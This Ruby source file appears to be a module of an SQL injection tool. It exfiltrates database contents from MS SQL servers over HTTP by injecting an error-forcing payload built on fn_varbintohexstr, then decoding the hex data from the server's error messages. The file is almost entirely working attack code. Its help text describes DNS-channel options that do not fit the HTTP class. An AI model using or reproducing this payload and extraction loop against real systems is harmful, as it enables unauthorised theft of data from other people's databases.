require 'dataset'

class SQLReturnChannelViaHTTP
	
	class InvalidVarFormat < Exception
	end

	class SigInt < Exception
	end

	class ReliabilityException < Exception
		attr_accessor(:current_line, :line_length)

		def initialize(current_line, line_length)
			self.current_line = current_line
			self.line_length = line_length 
		end

		def to_s
			str = "Reliability Exception. (current_line.length=#{@current_line.length},expected line length=#{@line_length}"
			str
		end
	end

	class OrderException < Exception
		attr_accessor(:line_num, :last_line_received, :byte_start, :last_byte_start)

		def initialize(line_num, last_line_received, byte_start, last_byte_start)
			self.line_num = line_num
			self.last_line_received = last_line_received
			self.byte_start = byte_start
			self.last_byte_start = last_byte_start
		end

		def to_s
			str = "Out of order or duplicate line. (line=#{line_num},last_line=#{last_line_received},byte_start=#{byte_start},last_byte_start=#{last_byte_start}"
			str
		end
	end
	
	def SQLReturnChannelViaHTTP.help
		puts "dns channel commands and variables"
		puts " variables:"
		puts "  request_timeout  : timeout in seconds to wait for tcpdump output"
		puts "  dns_domain       : domain which is appended to requests"
		puts "  dns_privs        : one of high, medium or low, specifies which method is used depending on the privilege level of the injection point"
		puts "  dns_server       : direct dns requests to this ip address"
	end

	def help
		SQLReturnChannelViaHTTP.help
	end
	
	def initialize(http, config)
		@tcpdump = nil
		@http = http
		@config = config

		if @config.getv("request_timeout").nil?
			@config.setv("request_timeout",60) #default timeout
		end

		raise HTTPException, "SQLReturnChannelViaHTTP requires a valid HTTP connection" if (@http.nil?)

		@sql_prefix = @config.getv("sql_prefix")
		if @sql_prefix =~ /;/
			Debug.print("HTTP channel does not support chained queries, but your sql_prefic contains a ;. Removing the semi-colon",0)
			@sql_prefix.gsub!(/;/,"")
		end

		@sql_postfix = @config.getv("sql_postfix")
		
	end

	def start(args)

		@block_size = 128
		@sql_output = " or 1 in (cast((select datalength(data) from #{args['table']} where num=LINENUM)as varchar(5))+master.dbo.fn_varbintohexstr(CONVERT(varbinary(5000),(select substring(data,STARTBYTE,#{@block_size}) from #{args['table']} where num=LINENUM))));"
			
		@data = DataSet.new(@block_size)

	end

	def eachline(&block)

		start_line = 1
		end_line = start_line 
		start_byte = 1

		continue = true
		empty_blocks = []
		while continue 

			Debug.print("Getting lines #{start_line} to #{end_line}",2)
			
			got_lines = false
			timeouts = 0
			while continue
				trap("SIGINT") { Debug.print("Caught the sigint... exiting command loop",2); continue = false }
				request = @sql_prefix + @sql_output.gsub(/LINENUM/, start_line.to_s).sub(/STARTBYTE/,start_byte.to_s) + @sql_postfix
				Debug.print(request,2)
				begin
					resp = @http.send(request)
				rescue HTTPException => e
					Debug.error("HTTP Error... timing out (or hit Ctrl-C to bust this timeout)")
					raise e
				end
				break if !continue

				Debug.print("Getting lines. Timeouts seen:#{timeouts}",2)
				blck = getblock(start_line,start_byte,resp)

				continue = false if @data.endofsql?
	
				if !blck.nil?
					if @data.complete?(start_line)
						block.call(start_line, @data[start_line]) 
						start_line += 1
						start_byte = 1
					else
						start_byte += @block_size
					end
				end
			end
		end
	end

	
	private

	def h2a(hex)
		hex.scan(/[0-9a-f][0-9a-f]/).collect {|c| c.hex.chr }.join
	end

	def getblock(line_num, byte_start, resp)
		
		resp.body =~ /nvarchar value '([0-9]+)0x([0-9a-f]+)'/

		return if $2.nil?

		line_length = $1
		returned_row = h2a($2)


		#halt asking for more rows if we've reached the last row in the table
		if returned_row =~ /ENDOFSQL/
			Debug.print("RowViaHTTP: [#{line_num}] Last line received",2)
			continue = false
			@data.dataset_end(line_num)
			return nil
		end

		if returned_row =~ /BLANKLINE/ 
			returned_row = ""
			line_length = 0
		end

		if returned_row !~ /ENDOFSQL/
			Debug.print("Data segment from HTTP: [#{line_num}:#{byte_start}]",2)
			@data.insert(line_num, byte_start, line_length.to_i, returned_row)
		end

		returned_row
	end
end
